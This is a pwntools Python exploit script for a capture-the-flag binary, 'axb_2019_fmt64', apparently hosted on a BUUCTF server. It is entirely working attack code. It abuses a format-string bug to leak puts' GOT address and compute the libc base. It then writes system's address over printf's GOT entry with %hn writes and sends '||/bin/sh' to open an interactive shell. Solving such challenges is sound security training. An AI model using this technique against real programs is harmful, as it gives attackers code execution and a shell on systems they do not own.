from pwn import *

context.log_level = 'debug'
context.bits = 64

pn = './axb_2019_fmt64'
#p = process(pn)
p = remote('node4.buuoj.cn', 27598)
elf = ELF(pn)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_got = elf.got['puts']
printf_got = elf.got['printf']

payload = b'%9$saaaa' + p64(puts_got)

p.sendlineafter(b'Please tell me:', payload)

p.recvuntil(b'Repeater:')

puts_real_addr = u64(p.recv(6).ljust(8, b'\0'))

libc_base = puts_real_addr - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

first = system & 0xffff
second = ( system & 0xffff0000 ) >> 16

addresses = []
flag = False
if first > second:
    flag = True

padding = 9
if flag:
    payload = '%{}c%{}$hn%{}c%{}$hn'.format(
        second - padding, '{}', 
        first - second, '{}'
    )
else:
    payload = '%{}c%{}$hn%{}c%{}$hn'.format(
        first - padding, '{}', 
        second - first, '{}'
    )

position = 8

padding = math.ceil(len(payload) / 8)
payload = payload.encode().ljust(padding * 8, b'a')
payload = payload.decode('ascii').format(
    position + padding, 
    position + padding + 1
).encode()

if flag:
    payload += p64(printf_got + 2) + p64(printf_got)
else:
    payload += p64(printf_got) + p64(printf_got + 2)

#this also works
#payload = fmtstr_payload(8, { printf_got : system }, numbwritten = 9)

print(payload)
print(hex(system))
p.sendlineafter(b'Please tell me:', payload)
p.sendline(b'||/bin/sh\0')

#gdb.attach(p)

p.interactive()